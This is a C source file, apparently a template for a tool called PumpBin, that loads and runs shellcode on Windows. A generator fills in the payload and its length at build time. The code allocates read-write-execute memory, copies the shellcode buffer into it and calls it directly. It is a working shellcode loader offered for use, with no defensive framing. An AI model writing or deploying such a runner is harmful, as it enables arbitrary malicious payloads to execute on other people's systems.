#include <windows.h>

/*
 * PumpBin shellcode runner template.
 * $$SHELLCODE$$ is replaced with real shellcode at generation time.
 * $$99999$$ is replaced with the shellcode length (zero-padded).
 */

unsigned char payload[4096] = "$$SHELLCODE$$\0$$99999$$";

int main(void) {
    void *exec = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) return 1;

    CopyMemory(exec, payload, 4096);

    ((void(*)())exec)();

    return 0;
}
